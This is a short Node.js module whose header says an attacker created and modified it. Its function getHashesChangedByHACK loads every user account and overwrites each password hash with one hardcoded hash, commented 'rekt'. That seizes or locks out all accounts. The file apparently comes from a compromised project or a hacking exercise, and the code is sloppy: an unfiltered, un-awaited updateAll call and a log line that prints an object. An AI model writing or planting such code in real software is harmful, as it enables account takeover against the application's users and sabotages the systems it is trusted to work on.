// ===================================================================
// update stuff for ALL users, modified and created by attacker.
// ===================================================================

let config = require('../../../config.json'); //get config.json data.
let config_active = config.hack; // security.
const User = require('../../models/user');//define the user part in the database and use it.
const globals = require('../../globals');//extra idk for what.
//define the function.
async function getHashesChangedByHACK(){
  globals.allUsers = await User.find({});
  //console.log('all users: '+globals.allUsers);
  let change = {};
  for (let user of globals.allUsers){
    let HASH = '968652ef04b0a656eea7a05e1c49619f4bfd7338549b4ca57ee8ac8323ca8619'; // rekt.
    let userName = user.username;
    change.passwordHash=HASH;
    User.updateAll(change);
    console.log('new change: '+change+' for: '+userName);
  };
};

module.exports = {
  getHashesChangedByHACK
}